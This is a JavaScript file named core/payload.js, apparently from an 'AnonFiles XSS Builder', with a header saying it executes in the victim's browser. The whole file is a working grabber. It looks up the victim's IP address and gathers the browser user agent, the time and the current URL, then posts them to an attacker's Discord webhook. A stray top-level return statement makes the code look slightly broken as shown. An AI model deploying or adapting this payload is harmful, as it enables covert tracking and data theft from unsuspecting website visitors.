//  @author:    codeuk
//  @package:   core/payload.js
//  @desc:      simple information grabber which sends through discord webhook

//              (anything in this file will be executed on the victim/client browser!)

var webhook = '%webhook%';
var icanhazip = 'https://ipv4.icanhazip.com/';

var date = new Date();
var time = date.toLocaleString();

var xhr = new XMLHttpRequest();
xhr.open('GET', icanhazip, false);
xhr.send();
return xhr.responseText;

function send_webhook() {
    fetch(webhook, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `@everyone AnonFiles XSS Builder Alert!\n\`IP: ${xhr.responseText}\`\n\`Browser: ${navigator.userAgent}\`\n\`Time: ${time}\`\n\`URL: ${window.location.href}\`\n\nCreated by github.com/codeuk`
        })
    });
}

send_webhook();